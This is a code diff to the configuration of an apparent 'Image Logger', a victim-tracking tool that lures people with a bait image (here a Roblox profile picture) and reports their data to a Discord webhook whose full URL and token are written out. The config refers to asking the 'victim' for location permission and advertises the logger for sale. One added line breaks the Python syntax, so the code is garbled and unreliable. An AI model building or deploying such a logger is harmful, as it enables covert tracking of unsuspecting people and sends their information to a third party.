@@ -5,12 +5,12 @@ import traceback, requests, base64, httpagentparser
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1402316405981974559/ztaF7G0JNHzeDibPZjmRVomOSQMxAgtSSQyrjlRGc2orHEokGPJK9sHiP7pBzafsaCvQ",
-    "image": "zdjhecei tu", # You can also have a custom image by using a URL argument
+    "image": "https://archive.org/download/89-profile-roblox-google-chrome-8-26-2020-10-29-25-pm/(89)%20Profile%20-%20Roblox%20-%20Google%20Chrome%208_26_2020%2010_29_25%20PM.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Name of the webhook, pick any name you want.
+    "username": "Captain Hook", # Name of the webhook, pick any name you want.
     "color": 0x00FFFF, # https://htmlcolorcodes.com/color-picker/
 
     # OPTIONS #
@@ -18,7 +18,7 @@ config = {
     
     "accurateLocation": False, # Asks victim for permissions to acces their location.
 
-    "message": { # Show a custom message when the user opens the image
+    "message": Oops image failed to load { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message? tu se mozesz dac co chcesz sory ze po angielsku ale amerykana sprzedaje tego loggera XD ale masz opisane ustawienia
         "message": "add @zjya on discord if u wanna buy the image logger", # Message to show
         "richMessage": False, # Enable rich text?
